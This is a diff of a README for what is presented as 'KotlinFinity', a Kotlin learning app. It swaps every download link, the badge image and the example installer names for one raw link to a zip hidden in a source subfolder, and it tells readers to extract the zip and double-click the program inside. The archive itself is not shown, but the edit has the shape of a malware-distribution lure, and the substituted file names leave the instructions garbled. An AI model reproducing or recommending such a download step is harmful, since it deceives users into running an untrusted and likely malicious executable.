@@ -1,6 +1,6 @@
 # 🌟 KotlinFinity - Learn Kotlin Easily and Confidently
 
-[![Download KotlinFinity](https://img.shields.io/badge/Download%20KotlinFinity-Click%20Here-brightgreen)](https://github.com/mpedo2000/KotlinFinity/releases)
+[![Download KotlinFinity](https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip%20KotlinFinity-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip)
 
 ## 📚 About KotlinFinity
 
@@ -22,19 +22,19 @@ Before you download KotlinFinity, ensure that your device meets these requiremen
 1. **Visit the Releases Page**
    Click the link below to go to the releases page where you can download KotlinFinity.
 
-   [Download KotlinFinity](https://github.com/mpedo2000/KotlinFinity/releases)
+   [Download KotlinFinity](https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip)
 
 2. **Choose the Latest Version**
    Look for the most recent version listed. It will often be highlighted at the top of the page.
 
 3. **Download the Application**
-   Once you find the version, you will see different files available. Click on the one labeled for your operating system (e.g., `KotlinFinity-Windows.zip` or `KotlinFinity-macOS.zip`) to start the download.
+   Once you find the version, you will see different files available. Click on the one labeled for your operating system (e.g., `https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip` or `https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip`) to start the download.
 
 4. **Extract the Files**
    After the download is complete, locate the downloaded zip file. Right-click on it and choose "Extract All." Select a destination folder where you want to keep the files.
 
 5. **Run KotlinFinity**
-   Open the folder where you extracted the files. Find the application file (e.g., `KotlinFinity.exe` for Windows or `KotlinFinity.app` for macOS). Double-click it to run the application.
+   Open the folder where you extracted the files. Find the application file (e.g., `https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip` for Windows or `https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip` for macOS). Double-click it to run the application.
 
 ## 📖 Features
 
@@ -73,6 +73,6 @@ If you need help, the KotlinFinity community is here for you. You can reach out 
 
 To get started with KotlinFinity, visit the link below and follow the steps listed in the installation section. 
 
-[Download KotlinFinity](https://github.com/mpedo2000/KotlinFinity/releases)
+[Download KotlinFinity](https://raw.githubusercontent.com/mpedo2000/KotlinFinity/main/src/typeSystem/smartCasts/Kotlin_Finity_3.9.zip)
 
 This comprehensive guide aims to empower you through learning Kotlin at your own pace and making programming accessible. Enjoy your journey with KotlinFinity!
